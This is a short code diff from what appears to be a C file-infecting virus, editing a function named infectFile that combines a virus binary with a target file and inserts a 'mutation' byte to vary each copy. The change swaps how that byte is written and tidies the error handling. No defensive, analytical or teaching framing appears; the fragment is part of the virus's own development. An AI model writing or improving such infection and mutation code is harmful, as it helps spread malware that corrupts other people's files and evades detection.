@@ -159,11 +159,10 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
     }
     fclose(virusFile);
 
-    // Insert byte of useless data (mutation)
-    if (fwrite("\x00\x00\x00\x01", 1, 4, tempFile) < 0) {
-        printf("Could not write mutation byte to temp file\n");
+    // Insert byte of empty data (mutation)
+    if (fputc('\0', tempFile) < 0) {
+        perror("Could not write mutation byte to temp file");
         fclose(fileToInfect);
-        fclose(virusFile);
         fclose(tempFile);
         remove(tempFileName);
         return -1;
